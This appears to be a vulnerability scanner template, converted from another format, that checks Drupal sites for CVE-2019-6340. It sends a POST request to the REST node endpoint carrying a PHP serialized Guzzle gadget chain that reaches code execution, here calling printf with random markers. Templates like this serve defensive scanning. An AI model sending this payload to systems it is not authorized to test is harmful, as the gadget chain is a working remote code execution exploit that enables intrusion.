id: yaml-poc-drupal-drupal-logical-CVE-2019-6340
info:
  name: Yaml Poc Drupal Drupal Logical Cve 2019 6340
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-drupal-drupal-logical-CVE-2019-6340'
  tags: drupal,cve
  classification:
    cve-id: CVE-2019-6340
  reference:
  - http://www.nsfocus.net/vulndb/42800
  - http://www.securityfocus.com/bid/107106
  - https://nvd.nist.gov/vuln/detail/CVE-2019-6340
  - https://packetstormsecurity.com/files/151820/Drupal-REST-Module-Remote-Code-Execution.html
  - https://vigilance.fr/vulnerability/Drupal-Core-code-execution-via-Web-Services-Module-28577
http:
- method: POST
  path:
  - /node/?_format=hal_json
  body: "{\n  \"link\": [\n    {\n      \"value\": \"link\",\n      \"options\": \"\
    O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\\
    Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\
    \\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\
    \";s:10:\\\"{{r1}}%%{{r2}}\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\
    \";a:1:{i:0;a:1:{i:0;s:6:\\\"printf\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\\
    u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\
    \"resolve\\\";}}\"\n    }\n  ],\n  \"_links\": {\n    \"type\": {\n      \"href\"\
    : \"http://{{host}}/rest/type/shortcut/default\"\n    }\n  }\n}\n"
  headers:
    Accept: '*/*'
    Content-Type: application/hal+json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 403
